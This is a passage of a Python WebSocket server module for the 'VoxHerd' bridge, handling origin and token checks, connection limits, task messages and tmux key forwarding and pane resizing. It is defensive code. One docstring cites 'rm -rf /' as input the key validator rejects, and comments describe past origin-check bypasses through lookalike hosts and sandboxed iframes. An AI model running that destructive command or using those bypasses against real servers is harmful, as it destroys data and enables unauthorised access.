"""WebSocket endpoint and all related handlers for the VoxHerd bridge.

Extracted from bridge_server.py. The main ``ios_websocket`` function is
registered by bridge_server via ``app.websocket("/ws/ios")(ios_websocket)``.
"""

from __future__ import annotations

import asyncio
import json
import os
import re
import secrets
import time
from collections import deque
from typing import TYPE_CHECKING
from urllib.parse import urlsplit

if TYPE_CHECKING:
    # Annotations only. These are imported lazily at every real use site to
    # break the ws_handler -> choice_detector -> activity cycle; a TYPE_CHECKING
    # block gives the annotations something to resolve to without reopening it.
    from bridge.choice_detector import ChoicePrompt, MultiQuestionForm

from fastapi import WebSocket, WebSocketDisconnect
from starlette.websockets import WebSocketState

from bridge.server_state import (
    sessions, ios_connections, _ios_lock, broadcast_to_ios, _state_sync_msg,
    send_signed, verify_message, log_event, _terminal_subs, _terminal_subs_lock, TerminalSub,
    _terminal_geometry, GeometryLease, set_geometry_release_hook,
    _cancel_terminal_subs_for_session, _cleanup_terminal_subs,
    _dispatch_timestamps,
)
from bridge.validation import (
    _sanitize_message, _sanitize_dispatch_text, _validate_project_dir, _load_projects,
    _validate_project_name,
    _MAX_EVENT_PAYLOAD_LEN, _MAX_WS_CONNECTIONS, _is_safe_tmux_target,
    _DISPATCH_RATE_LIMIT, _DISPATCH_RATE_WINDOW, _PROJECTS_PATH,
    _validate_tmux_pane_target, _validate_tmux_window_target,
)
from bridge.auth import get_auth_token
from bridge import task_store
from bridge import tmux_manager
from bridge import reader
from bridge import pane_geometry
from bridge.env_utils import get_subprocess_env
from bridge.transcript_render import find_transcript_path, render_transcript_cached
import bridge.server_state as _state
from bridge.assistant import (
    apply_assistant_env,
    build_tmux_spawn_argv,
    default_assistant,
    is_supported_assistant,
    normalize_assistant,
    resume_command_for_assistant,
    supports_hooks,
)


# ---------------------------------------------------------------------------
# WebSocket endpoint
# ---------------------------------------------------------------------------


_KNOWN_WS_TYPES = frozenset({
    "voice_command", "status_request", "tasks_request", "task_create",
    "task_update", "terminal_subscribe", "terminal_unsubscribe",
    "terminal_send_keys", "spawn_session", "stop_session", "kill_session",
    "set_verbosity", "set_client_setting", "speech_floor",
})


_ALLOWED_ORIGINS = frozenset({
    # Native apps (iOS URLSessionWebSocketTask, the Android client) send no
    # Origin header at all, which arrives here as None or "". A browser always
    # sends one, so anything else must match the loopback hosts below.
    #
    # "null" is NOT in this set. It used to be, and it is what a sandboxed
    # iframe, a data: URL and a file:// page all send -- so any page on the
    # internet could pass the check by framing itself with
    # `<iframe sandbox="allow-scripts">`.
    None, "",
})

# Hosts a browser-originated WebSocket may come from. Matched on the parsed
# host, exactly: the previous test was `origin.startswith("http://localhost")`,
# which also accepted `http://localhost.attacker.com` and
# `http://127.0.0.1.attacker.com`. WebSockets are exempt from CORS, so Origin is
# the only browser-facing control on this endpoint.
_ALLOWED_ORIGIN_HOSTS = frozenset({"localhost", "127.0.0.1", "[::1]", "::1"})
_ALLOWED_ORIGIN_SCHEMES = frozenset({"http", "https"})


def _is_allowed_origin(origin: str | None) -> bool:
    """Return True if the WebSocket Origin header is acceptable."""
    if origin in _ALLOWED_ORIGINS:
        return True
    if not origin:
        return False
    try:
        parsed = urlsplit(origin)
    except ValueError:
        return False
    if parsed.scheme not in _ALLOWED_ORIGIN_SCHEMES:
        return False
    return (parsed.hostname or "").lower() in _ALLOWED_ORIGIN_HOSTS


def _replay_status_payload(s) -> dict | None:
    """Compute the ``session_status`` payload to replay to a freshly
    connected client for one session.

    Active sessions replay their live cached status verbatim (real working
    label / elapsed / tokens).

    Idle/waiting sessions replay the cached status too, BUT only when it's a
    settled (``spinner is False``) snapshot. That's where the activity poll
    stores the tmux-derived "what Claude just did" action label ("Ran 1 shell
    command", "Read 1 file", …) — without this, a client connecting AFTER a
    session went idle would only ever see the bare enum label ("Idle"/
    "Completed"), since the action label is broadcast live only at the
    idle-transition edge. A still-spinning cache is skipped on purpose: it's a
    working label left over from a turn that has since finished, and replaying
    it would show a spinner on an idle session. In both the no-cache and
    skipped-spinner cases we fall back to a freshly derived enum status that
    still carries the sticky ``_last_context_pct`` so the lens header chip
    shows for every session, not just the active one.

    Returns ``None`` when an active session has no cached status yet (nothing
    useful to send; the next poll edge will deliver one).
    """
    # Imported lazily to keep ws_handler import-light and decoupled from the
    # activity/session_status load order. (Not strictly required today — the
    # activity→ws_handler edge is already lazy, so there's no real cycle — but
    # it future-proofs against that becoming eager.)
    from bridge import session_status
    cached = getattr(s, "_last_broadcast_status", None)
    if getattr(s, "status", None) == "active":
        return cached if isinstance(cached, dict) else None
    # Idle/waiting: replay the settled action-label snapshot when present.
    if isinstance(cached, dict) and cached.get("spinner") is False:
        return cached
    return session_status.derive_status(
        s, None, None, context_pct=getattr(s, "_last_context_pct", None)
    )


def _connect_replay_status_messages(all_sessions: dict) -> list[dict]:
    """Build the ``session_status`` messages to replay to a freshly
    connected client — one per session that has a payload.

    EVERY session (active AND idle) is included so the lens header chip /
    footer shows for all of them on connect, not just the active one. The
    activity poll only broadcasts on EDGE changes, so anything omitted here
    never reaches an idle-but-stable session's lens.

    Regression guard: do NOT re-add an ``active``-only skip in this loop —
    that was the bug where only the one active session showed a context %.
    """
    msgs: list[dict] = []
    for sid, s in all_sessions.items():
        payload = _replay_status_payload(s)
        if payload is None:
            continue
        msgs.append({"type": "session_status", "session_id": sid, **payload})
    return msgs


def _connect_replay_decision_messages(all_sessions: dict) -> list[dict]:
    """Build ``choice_prompt`` / ``question_form`` messages to replay to a
    freshly connected iOS client for any session with a decision card
    currently on screen.

    The rising-edge broadcast (in the activity poll) fires only ONCE when a
    prompt/form appears. A client that connects (or reconnects) AFTER that
    edge would otherwise never learn about an active decision — the lens
    would show the dashboard while the Mac terminal sits blocked on a
    prompt or form. Replaying the cached decision closes that gap.
    """
    from bridge import activity

    msgs: list[dict] = []
    for sid, form in list(activity._LAST_FORM_FOR_SESSION.items()):
        session = all_sessions.get(sid)
        if session is None:
            continue
        msgs.append(activity._question_form_msg(session, form))
    for sid, choice in list(activity._LAST_CHOICE_FOR_SESSION.items()):
        session = all_sessions.get(sid)
        if session is None:
            continue
        msgs.append(activity._choice_prompt_msg(session, choice))
    return msgs


async def ios_websocket(websocket: WebSocket) -> None:
    """Persistent WebSocket connection for an iOS client."""
    # Origin check: reject browser connections from untrusted origins
    origin = websocket.headers.get("origin")
    if not _is_allowed_origin(origin):
        log_event("warning", "bridge", f"WebSocket rejected: disallowed origin '{origin}'")
        await websocket.close(code=4003, reason="Forbidden origin")
        return

    # Auth check for WebSocket connections
    auth_token = get_auth_token()
    if auth_token:
        # Check query param ?token=... (WebSocket clients can't easily set headers)
        token = websocket.query_params.get("token", "")
        # Also check Sec-WebSocket-Protocol header as a fallback
        if not token:
            for header_name, header_val in websocket.headers.items():
                if header_name.lower() == "authorization" and header_val.startswith("Bearer "):
                    token = header_val[7:]
                    break
        # Encoded before comparing: the token arrives percent-decoded from the
        # query string, and compare_digest raises TypeError on a str holding any
        # non-ASCII character — `?token=%C3%A9` crashed the handshake instead of
        # rejecting it.
        if not token or not secrets.compare_digest(
            token.encode("utf-8", "surrogateescape"),
            auth_token.encode("utf-8", "surrogateescape"),
        ):
            await websocket.close(code=4001, reason="Unauthorized")
            log_event("error", "bridge", "WebSocket connection rejected: unauthorized")
            return

    # Connection limit. Counted and claimed under ONE lock acquisition: the
    # check used to release the lock, `await websocket.accept()` (which yields),
    # and only then append -- so every handshake in flight read the same
    # pre-append count and they all got in. Measured: 50 concurrent handshakes
    # against a limit of 10 left 50 in `ios_connections`. Each of those can
    # subscribe to every session's terminal, and each subscription is its own
    # poll loop spawning `tmux capture-pane` twice a second.
    #
    # The slot is reserved before accept() and released if accept() fails, so the
    # count can never exceed the limit even transiently.
    async with _ios_lock:
        if len(ios_connections) >= _MAX_WS_CONNECTIONS:
            over_limit = True
        else:
            over_limit = False
            ios_connections.append(websocket)

    if over_limit:
        await websocket.accept()
        await websocket.close(code=4002, reason="Too many connections")
        log_event("warning", "bridge", "WebSocket rejected: connection limit reached")
        return

    # The try/finally starts HERE, immediately after the slot was claimed, not
    # after the replay below. `accept()` and every `send_signed` in between can
    # raise -- a client that drops the moment it connects is ordinary -- and any
    # raise before the `finally` left the socket in `ios_connections` forever.
    # That leak was survivable while the connection limit was racy and
    # over-subscribable; with the limit actually enforced, ten of them lock every
    # client out until the bridge restarts.
    try:
        await websocket.accept()

        # Send current state immediately so the client is up-to-date.
        await send_signed(websocket,_state_sync_msg())

        # Replay a lens-footer status for EVERY session so a fresh client gets
        # a populated footer immediately (see _connect_replay_status_messages).
        for msg in _connect_replay_status_messages(sessions.get_all_sessions()):
            await send_signed(websocket, msg)

        # Replay any active decision card (choice prompt / multi-question form)
        # so a client connecting AFTER the rising-edge broadcast still sees it.
        for msg in _connect_replay_decision_messages(sessions.get_all_sessions()):
            await send_signed(websocket, msg)

        log_event("warning", "bridge", "iOS client connected")

        while True:
            raw = await websocket.receive_text()
            _state.bump_inbound("received")
            # Reject oversized messages
            if len(raw) > _MAX_EVENT_PAYLOAD_LEN:
                _state.bump_inbound("oversized")
                log_event("warning", "bridge", f"Oversized WS message dropped ({len(raw)} bytes)")
                continue
            try:
                data = json.loads(raw)
            except (json.JSONDecodeError, ValueError):
                _state.bump_inbound("malformed")
                log_event("warning", "bridge", "Malformed JSON on WebSocket")
                continue

            # A frame has to be a JSON OBJECT. `dict(data)` below raises on a
            # list or a scalar, and the loop catches only WebSocketDisconnect,
            # so `["a"]` or `42` tore the connection down -- subscriptions and
            # geometry lease with it -- where a malformed frame should just be
            # dropped like any other.
            if not isinstance(data, dict):
                _state.bump_inbound("malformed")
                log_event("warning", "bridge", "WS frame was not a JSON object")
                continue

            if not _frame_string_fields_ok(data):
                _state.bump_inbound("malformed")
                log_event("warning", "bridge", "WS frame had a non-string session_id/target")
                continue

            # Verify HMAC signature when auth is enabled
            if not verify_message(dict(data)):
                # No per-type key here: the type string is client-controlled
                # and unverified at this point.
                _state.bump_inbound("hmac_fail")
                log_event("warning", "bridge", "HMAC verification failed on incoming WS message")
                continue

            msg_type = data.get("type", "")

            # Drop unknown message types (bump the per-type counter only for
            # KNOWN types so client-supplied strings can't mint stat keys).
            if msg_type not in _KNOWN_WS_TYPES:
                _state.bump_inbound("unknown_type")
                log_event("warning", "bridge", f"Unknown WS message type: {msg_type!r}")
                continue
            _state.bump_inbound(f"ok:{msg_type}")

            if msg_type == "voice_command":
                await handle_voice_command(data, websocket)
            elif msg_type == "status_request":
                await send_signed(websocket,_state_sync_msg())
            elif msg_type == "tasks_request":
                await _handle_tasks_request(data, websocket)
            elif msg_type == "task_create":
                await _handle_task_create(data, websocket)
            elif msg_type == "task_update":
                await _handle_task_update(data, websocket)
            elif msg_type == "terminal_subscribe":
                await _handle_terminal_subscribe(data, websocket)
            elif msg_type == "terminal_unsubscribe":
                await _handle_terminal_unsubscribe(data, websocket)
            elif msg_type == "terminal_send_keys":
                await _handle_terminal_send_keys(data, websocket)
            elif msg_type == "spawn_session":
                await _handle_spawn_session(data, websocket)
            elif msg_type == "stop_session":
                await _handle_stop_session(data, websocket)
            elif msg_type == "kill_session":
                await _handle_kill_session(data, websocket)
            elif msg_type == "set_verbosity":
                await _handle_set_verbosity(data)
            elif msg_type == "set_client_setting":
                await _handle_set_client_setting(websocket, data)
            elif msg_type == "speech_floor":
                await _handle_speech_floor(websocket, data)
    except WebSocketDisconnect:
        pass
    finally:
        # Before the subscriptions go: a disconnecting client must not leave
        # the user's pane stuck at its panel size.
        await _release_all_geometry(websocket)
        # Nor the phones and the Mac silent for a headset that has gone.
        if _state.release_speech_floor_of(websocket):
            log_event("info", "bridge", "Speech floor released: its headset disconnected")
            try:
                await broadcast_to_ios(_state._state_sync_msg())
            except Exception:
                pass
        await _cleanup_terminal_subs(websocket)
        async with _ios_lock:
            try:
                ios_connections.remove(websocket)
            except ValueError:
                pass
        log_event("warning", "bridge", "iOS client disconnected")


# ---------------------------------------------------------------------------
# Task WebSocket handlers
# ---------------------------------------------------------------------------


#: Caps on client-supplied task text. Unbounded, each `task_create` wrote a
#: file of whatever size under ~/.claude/tasks/ with no count limit, and both
#: fields are broadcast verbatim to every client and rendered on the lens.
_MAX_TASK_TEXT = 500


def _valid_task_project(raw: object) -> str | None:
    """A task-list name safe to use as a directory, or None.

    ``_validate_project_name`` is not enough on its own here: its character class
    permits "." and "..", and the value becomes a path component under
    ``~/.claude/tasks/``. ``task_store._sanitize_id`` raises ValueError on those,
    which used to escape the handler -- out of the WebSocket receive loop, which
    catches only WebSocketDisconnect, tearing the client's connection down (and
    its terminal subscriptions and geometry lease with it).
    """
    if not isinstance(raw, str):
        return None
    name = raw.strip()
    if not name or name in (".", "..") or "/" in name or "\\" in name:
        return None
    if _validate_project_name(name) is not None:
        return None
    return name


def _task_text(raw: object) -> str:
    """Client-supplied task text, sanitized and capped."""
    if not isinstance(raw, str):
        return ""
    return _sanitize_message(raw)[:_MAX_TASK_TEXT]


async def _send_tasks_sync(project: str, ws: WebSocket) -> None:
    """Send a tasks_sync message for a project to a single WebSocket."""
    try:
        list_id = task_store.resolve_task_list_id(project)
    except ValueError:
        return
    tasks = task_store.list_tasks(list_id) if list_id else []
    try:
        await send_signed(ws,{
            "type": "tasks_sync",
            "project": project,
            "tasks": tasks,
        })
    except Exception:
        pass


async def _handle_tasks_request(data: dict, ws: WebSocket) -> None:
    """Respond with all tasks for the requested project."""
    project = _valid_task_project(data.get("project"))
    if not project:
        return
    await _send_tasks_sync(project, ws)


async def _handle_task_create(data: dict, ws: WebSocket) -> None:
    """Create a task and respond with updated task list."""
    project = _valid_task_project(data.get("project"))
    subject = _task_text(data.get("subject"))
    if not project or not subject:
        return
    description = _task_text(data.get("description"))
    active_form = _task_text(data.get("activeForm"))
    try:
        list_id = task_store.resolve_task_list_id(project) or project
        task_store.create_task(list_id, subject, description, active_form)
    except ValueError:
        return
    log_event("success", project, f"Task created (WS): {subject}")
    await _send_tasks_sync(project, ws)


async def _handle_task_update(data: dict, ws: WebSocket) -> None:
    """Update a task and respond with updated task list."""
    project = _valid_task_project(data.get("project"))
    task_id = data.get("task_id", "")
    if not project or not isinstance(task_id, str) or not task_id:
        return
    updates = {}
    for field in ("status", "subject", "description", "activeForm"):
        if field in data:
            # Capped and sanitized like create: `subject` and `activeForm` are
            # broadcast verbatim in sub_agent_update and drawn on the glasses.
            updates[field] = _task_text(data[field])
    if not updates:
        return
    try:
        list_id = task_store.resolve_task_list_id(project)
        if list_id:
            task_store.update_task(list_id, task_id, **updates)
            log_event("info", project, f"Task {task_id} updated (WS): {updates}")
    except ValueError:
        return
    await _send_tasks_sync(project, ws)


# ---------------------------------------------------------------------------
# Terminal streaming
# ---------------------------------------------------------------------------

# How many lines back through the tmux scrollback we capture each poll. For a
# pane WITHOUT a transcript (plain shell), this is the full mirror the phone
# scrolls — iOS snapshot-replaces terminalContent, so the capture window is the
# scrollback depth. For Claude/Codex panes we instead source deep history from
# the transcript JSONL (see below) and keep only the last _TRANSCRIPT_LIVE_TAIL_ROWS
# of this capture as the "live" tail — because those panes render in the tmux
# alternate screen and keep zero scrollback (history_size=0), so a big capture
# returns only the one visible screen anyway. Change-gated: an idle pane costs
# nothing.
_TERMINAL_CAPTURE_LINES = 2000

# --- Transcript-sourced scrollback ----------------------------------------
# Claude Code / Codex render in the tmux alternate screen, where tmux keeps no
# scrollback — so the live capture above can only show one screen. The real
# conversation is on disk in the assistant transcript JSONL. When we can find
# it, the poll loop renders it (bridge/transcript_render.py) and splices it in
# FRONT of the live tmux tail, so the phone can scroll back through the whole
# chat log. Falls back to the plain tmux mirror whenever no transcript exists.
_TRANSCRIPT_SCROLLBACK_ENABLED = os.environ.get("VOXHERD_TRANSCRIPT_SCROLLBACK", "1") not in (
    "0", "false", "no", "off",
)
_TRANSCRIPT_MAX_LINES = 2000  # cap on rendered history lines (newest kept)
_TRANSCRIPT_LIVE_TAIL_ROWS = 80  # rows of the live tmux screen to append below history
_TRANSCRIPT_SEPARATOR = "──────────── live ────────────"  # divider: history above, live below

# When the ONLY poll-to-poll delta is the animated working line's ticking
# elapsed/spinner, resend at this relaxed cadence instead of every 500ms poll
# (the visible timer still advances; the wire/CPU cost drops 4x).
_WORKING_TICK_RESEND_SECONDS = 2.0

# Hard ceiling on the characters across a terminal_content `lines` array.
# iOS's URLSessionWebSocketTask receive cap is 1 MiB/message; with JSON+ANSI
# escaping overhead (ESC encodes as 6 chars), ~600k raw chars keeps the
# encoded frame comfortably under it. Oldest lines are dropped first.
_MAX_OUTBOUND_CONTENT_CHARS = 600_000

# Terminal render modes. ``filtered`` (the default, and what every client
# before the headset sends) runs the chrome strippers in _apply_chrome_filters;
# ``ansi`` ships the pane verbatim. Both carry SGR escapes on the wire --
# capture-pane runs with -e and neither path strips them.
#
# An unknown mode falls back to ``filtered`` rather than erroring: a client
# newer than the bridge must degrade to a working terminal, never a dead one.
_TERMINAL_MODES = frozenset({"filtered", "ansi"})
_DEFAULT_TERMINAL_MODE = "filtered"


def _coerce_terminal_mode(value: object) -> str:
    """Normalize a client-supplied terminal mode, defaulting to ``filtered``."""
    mode = value if isinstance(value, str) else ""
    mode = mode.strip().lower()
    return mode if mode in _TERMINAL_MODES else _DEFAULT_TERMINAL_MODE


# Bounds for a client-requested pane size. These land in tmux argv, so they
# are hard-validated as plain ints rather than trusted: anything outside the
# window is dropped and the pane keeps whatever size it already had.
# The ceiling is generous (a headset panel is ~80x48) but finite -- tmux
# allocates a grid per window, so a client asking for 100000 rows would burn
# real memory on the dev machine.
_MIN_TERMINAL_COLS, _MAX_TERMINAL_COLS = 20, 500
_MIN_TERMINAL_ROWS, _MAX_TERMINAL_ROWS = 5, 200

# tmux key names accepted in the `key_sequence` form. This is the set tmux
# itself documents; a name outside it is rejected with an error rather than
# handed to tmux, because tmux exits non-zero on an unknown key name and -- see
# _send_tmux_keys -- a silent no-op is exactly the failure mode we are trying
# to kill. Compared case-insensitively.
_TMUX_NAMED_KEYS: frozenset[str] = frozenset(
    k.lower()
    for k in (
        "Enter", "Escape", "Space", "Tab", "BTab", "BSpace",
        "DC", "Delete", "IC", "Insert", "Home", "End",
        "NPage", "PageDown", "PgDn", "PPage", "PageUp", "PgUp",
        "Up", "Down", "Left", "Right",
        *(f"F{n}" for n in range(1, 13)),
    )
)
# Modifier prefixes tmux understands: Ctrl, Meta/Alt, Shift.
_TMUX_MODIFIERS: frozenset[str] = frozenset("CMS")
_MAX_KEY_NAME_LEN = 32
_MAX_KEY_SEQUENCE = 64


def _is_valid_tmux_key(name: object) -> bool:
    """True when *name* is a tmux key name we are willing to forward.

    Accepts an optional run of ``C-``/``M-``/``S-`` modifier prefixes followed
    by either a documented key name or a single printable character, so
    ``C-c``, ``M-Enter``, ``S-Tab``, ``F5`` and ``a`` all pass while
    ``rm -rf /`` and ``Entr`` do not.
    """
    if not isinstance(name, str) or not name or len(name) > _MAX_KEY_NAME_LEN:
        return False
    body = name
    while len(body) > 2 and body[0] in _TMUX_MODIFIERS and body[1] == "-":
        body = body[2:]
    if body.lower() in _TMUX_NAMED_KEYS:
        return True
    return len(body) == 1 and body.isprintable()


def _coerce_key_sequence(value: object) -> list[str] | None:
    """Validate a ``key_sequence`` payload, or ``None`` when it is unusable.

    One WebSocket message carries a whole sequence -- a Bluetooth keyboard on
    the headset produces ``["C-c", "Enter"]`` far more often than it produces a
    single keystroke, and tmux ``send-keys`` takes them all in one call, so
    this is one round trip and one subprocess instead of N of each.
    """
    if not isinstance(value, list) or not value:
        return None
    if len(value) > _MAX_KEY_SEQUENCE:
        return None
    if not all(_is_valid_tmux_key(k) for k in value):
        return None
    return list(value)


async def _send_tmux_keys(
    target: str, args: list[str], *, literal: bool
) -> tuple[bool, str]:
    """Run ``tmux send-keys``, returning ``(ok, error)``.

    **Checks the return code.** ``send-keys`` against a dead pane exits
    non-zero without raising -- that silent failure is what wedged a session
    in "Sending to <project>" once already (see test_dispatch_dead_pane). The
    raw-keys path used to have the same hole: it awaited the process and threw
    the result away, so typing into a dead pane did nothing, with nothing said.
    """
    cmd = ["tmux", "send-keys", "-t", target]
    if literal:
        cmd.append("-l")
    # End of options: without it a payload beginning with "-" is read as a tmux
    # flag instead of as keys. "-N5" is send-keys' repeat count -- tmux exits 0,
    # nothing reaches the pane, and the caller is told the keys were delivered.
    cmd.append("--")
    cmd.extend(args)
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.PIPE,
            env=get_subprocess_env(),
        )
        _, stderr = await asyncio.wait_for(proc.communicate(), timeout=5.0)
    except Exception as exc:
        return False, str(exc)
    if proc.returncode != 0:
        return False, (stderr.decode(errors="replace").strip() if stderr else "unknown error")
    return True, ""


def _coerce_terminal_geometry(data: dict) -> tuple[int, int] | None:
    """Pull a sane (cols, rows) out of a subscribe payload, else ``None``.

    ``bool`` is a subclass of ``int`` in Python, so it is excluded explicitly
    -- ``{"cols": true}`` must not resize a pane to one column.
    """
    cols, rows = data.get("cols"), data.get("rows")
    if isinstance(cols, bool) or isinstance(rows, bool):
        return None
    if not isinstance(cols, int) or not isinstance(rows, int):
        return None
    if not (_MIN_TERMINAL_COLS <= cols <= _MAX_TERMINAL_COLS):
        return None
    if not (_MIN_TERMINAL_ROWS <= rows <= _MAX_TERMINAL_ROWS):
        return None
    return cols, rows


async def _tmux(*args: str) -> tuple[int, str]:
    """Run a tmux command, returning ``(returncode, stdout)``.

    Never raises: geometry is a nicety, and a tmux hiccup must not take down
    a terminal subscription.
    """
    try:
        proc = await asyncio.create_subprocess_exec(
            "tmux", *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
            env=get_subprocess_env(),
        )
        stdout, _ = await proc.communicate()
        return proc.returncode or 0, stdout.decode("utf-8", errors="replace").strip()
    except Exception:
        return 1, ""


async def _read_window_geometry(target: str) -> tuple[int, int, str] | None:
    """Current ``(cols, rows, window-size option)`` for *target*'s window.

    The option comes back ``""`` when the window inherits the global value.
    """
    rc, out = await _tmux("display-message", "-t", target, "-p",
                          "#{window_width}x#{window_height}")
    if rc != 0 or "x" not in out:
        return None
    width, _, height = out.partition("x")
    try:
        cols, rows = int(width), int(height)
    except ValueError:
        return None
    _rc, opt = await _tmux("show-options", "-w", "-t", target, "-v", "window-size")
    return cols, rows, opt


# How long a lease is protected from handover. Long enough that two clients
# genuinely contending settle instead of trading resizes at poll rate; short
# enough that a client relaunching does not have to wait to draw correctly.
_GEOMETRY_HANDOVER_COOLDOWN = 3.0


def _holder_is_live(ws: WebSocket) -> bool:
    """True when the bridge still *believes* it is serving *ws*.

    Deliberately weak, and not the whole liveness answer. A client killed
    without closing its socket leaves a half-open TCP connection: the server
    stays blocked in ``receive``, the connection is still on the list, and
    ``client_state`` still reads CONNECTED. This returns True for that client
    -- which is precisely why handover cannot rest on it alone. It only catches
    the holder the bridge has already finished tearing down.
    """
    if ws not in _state.ios_connections:
        return False
    state = getattr(ws, "client_state", None)
    return state is None or state == WebSocketState.CONNECTED


async def _acquire_geometry(
    session_id: str, target: str, ws: WebSocket, cols: int, rows: int
) -> bool:
    """Take (or update) this session's geometry lease and resize the window.

    A live ``ansi`` subscriber keeps the pane: two clients trading resizes
    would reflow the TUI on every poll, so a second one asking for a different
    size is refused (and told, by the caller -- silence here is what made this
    invisible for a day).

    **A lease outlives its holder, and liveness cannot be asked for.** A client
    killed without closing its socket leaves a half-open connection: the server
    stays blocked in ``receive``, the connection is still on the list, and
    ``client_state`` still reads CONNECTED. Every signal the bridge has says
    the dead client is fine. So handover is gated on the lease's **age**
    instead: a claim older than the cooldown yields to a new client, which
    lets a relaunched app take the pane back, while two clients genuinely
    contending are each blocked inside the window and settle rather than
    trading resizes on every poll.

    A takeover keeps the previous holder's ``prev_*`` values, which are the
    pane's *real* original size -- restoring to the width the dead client left
    behind would make the damage permanent.
    """
    held = _terminal_geometry.get(session_id)
    if held is not None and held.ws is not ws:
        fresh = (time.monotonic() - held.acquired_at) < _GEOMETRY_HANDOVER_COOLDOWN
        if fresh and _holder_is_live(held.ws):
            log_event(
                "warning",
                "bridge",
                f"Geometry {cols}x{rows} refused: {session_id[:12]}... claimed moments ago",
            )
            return False
        log_event(
            "info",
            "bridge",
            f"Geometry handover for {session_id[:12]}...: {held.cols}x{held.rows} -> {cols}x{rows}",
        )

    if held is None:
        current = await _read_window_geometry(target)
        if current is None:
            return False
        prev_cols, prev_rows, prev_opt = current
    else:
        if (held.cols, held.rows) == (cols, rows):
            return True  # already this size; skip the subprocess
        prev_cols, prev_rows, prev_opt = held.prev_cols, held.prev_rows, held.prev_window_size

    rc, _ = await _tmux("resize-window", "-t", target, "-x", str(cols), "-y", str(rows))
    if rc != 0:
        return False
    _terminal_geometry[session_id] = GeometryLease(
        ws=ws, cols=cols, rows=rows,
        prev_cols=prev_cols, prev_rows=prev_rows, prev_window_size=prev_opt,
        acquired_at=time.monotonic(),
    )
    # Write the undo down before anyone depends on it. A lease lives in memory
    # and is released by the socket teardown, so a killed bridge used to drop
    # the only record of the pane's real size -- and the next client then read
    # the panel size as the original and made it permanent. See
    # `bridge/pane_geometry.py`.
    pane_geometry.record(target, prev_cols, prev_rows, prev_opt)
    return True


async def _restore_window(target: str, cols: int, rows: int, window_size: str) -> None:
    """Put *target*'s window back to *cols* x *rows* and *window_size*.

    Order matters: dimensions first, then the ``window-size`` option.
    ``resize-window`` sets that option to ``manual`` as a side effect, so
    clearing it first would just get it set again by the restore.

    Shared by the ordinary release and the startup sweep for the panes a killed
    bridge left pinned, because "put a window back" written twice is how the
    two would come to disagree -- and the sweep is the path nobody watches.
    """
    await _tmux("resize-window", "-t", target, "-x", str(cols), "-y", str(rows))
    if window_size:
        await _tmux("set-option", "-w", "-t", target, "window-size", window_size)
    else:
        await _tmux("set-option", "-w", "-t", target, "-u", "window-size")


async def _release_geometry(session_id: str, ws: WebSocket) -> None:
    """Give a session's window its original size back. No-op unless *ws* holds it.

    The persisted record is dropped only once the window has actually been put
    back, which is why the early return below leaves it in place: a session
    pruned out from under its lease takes the only copy of its tmux target with
    it, so release cannot reach the pane -- but the record is keyed by window
    and ``restore_stranded_panes`` can, on the next start. Forgetting it here
    would be tidier and would strand the pane.
    """
    lease = _terminal_geometry.get(session_id)
    if lease is None or lease.ws is not ws:
        return
    del _terminal_geometry[session_id]

    session = sessions.get_session(session_id)
    target, err = _validate_tmux_pane_target(session.tmux_target if session else None)
    if err or not target:
        return  # the target is unknown here; the startup sweep still has it
    # The persisted record outranks the lease -- see `pane_geometry.lookup`.
    # `lease.prev_*` is what the window measured when *this* lease was taken,
    # which is the stranded size whenever a previous run was killed holding it.
    # Restoring to that is a no-op, and the `forget` below then discards the
    # only copy of the real size, so the pane is stuck for good with nothing
    # left to put it back. The record is first-writer-wins across restarts and
    # still holds the size the developer actually had.
    owed = pane_geometry.lookup(target)
    if owed is not None:
        await _restore_window(target, owed.cols, owed.rows, owed.window_size)
    else:
        await _restore_window(target, lease.prev_cols, lease.prev_rows, lease.prev_window_size)
    pane_geometry.forget(target)


async def _release_all_geometry(ws: WebSocket) -> None:
    """Drop every lease held by a disconnecting client."""
    for session_id in [sid for sid, lease in _terminal_geometry.items() if lease.ws is ws]:
        await _release_geometry(session_id, ws)


async def restore_stranded_panes() -> int:
    """Put back every window a previous run resized and never released.

    Called once at startup, before anything is served. After a clean shutdown
    this finds nothing, because each release calls ``pane_geometry.forget``;
    what it does find is the aftermath of a kill -- a crash, a `kill -9`, a
    rebuilt ``.app`` -- which used to leave the developer's pane at panel width
    with ``window-size manual`` set, no longer tracking their terminal, and no
    record anywhere of what it had been.

    A window that no longer exists is simply forgotten: there is nothing to put
    back, and keeping the record would mean trying again on every start.

    Returns how many windows were restored, for the log and for the tests.
    """
    owed = pane_geometry.pending()
    if not owed:
        return 0
    restored = 0
    for pane in owed:
        # The record is a file on disk, which is the weakest provenance of any
        # tmux target in this module -- every other one is validated, and this
        # one is fed to tmux unattended at startup. A window target has no
        # `.pane`, so the pane validator cannot be reused directly.
        target, err = _validate_tmux_window_target(pane.window)
        if err or not target:
            log_event("warning", "bridge", f"Pane geometry: refusing {pane.window!r}: {err}")
            continue
        if await _read_window_geometry(pane.window) is None:
            log_event("info", "bridge", f"Pane geometry: {pane.window} is gone; forgetting it")
            continue
        await _restore_window(pane.window, pane.cols, pane.rows, pane.window_size)
        restored += 1
        log_event(
            "warning",
            "bridge",
            f"Pane geometry: restored {pane.window} to {pane.cols}x{pane.rows} "
            "(a previous run was killed while holding it)",
        )
    pane_geometry.clear()
    return restored


# server_state tears subscriptions down on its own for pruned sessions, and
# the pane survives a re-registration under a new id, so it needs a way back
# in here to drop the lease.
set_geometry_release_hook(_release_geometry)


# Substring markers that identify Claude Code's status footer rows. Kept
# conservative so a real conversation line containing one of these phrases
# in the middle of running output doesn't get clobbered — we only strip
# from the bottom and only contiguous footer-shaped rows.
_ASSISTANT_FOOTER_MARKERS: tuple[str, ...] = (
    "bypass permissions",
    "shift+tab to cycle",
    "for agents",
    "(plan mode)",
    "(ask only)",
    "shell still running",
)
_ASSISTANT_FOOTER_PREFIXES: tuple[str, ...] = (
    "►►",
    "⏵⏵",
    "🌿",
    "✻ cooked for",
)

# Box-drawing / decorative characters Claude Code uses to render its
# multi-line text input border, plan-mode section separators, and other
# pure-chrome rows. When a row contains ONLY characters from this set
# (after ANSI stripping) it's eligible for removal by the divider /
# footer passes. The user wants their actual content at the bottom of
# the visible area, not three rows of empty textbox outline below it.
#
# Categories included:
#   space/tab           " \t"
#   ASCII dividers      "_ -"
#   Box-drawing lines   "─ ━ ═ ╌ ╍ │ ┃ ╎ ╏"
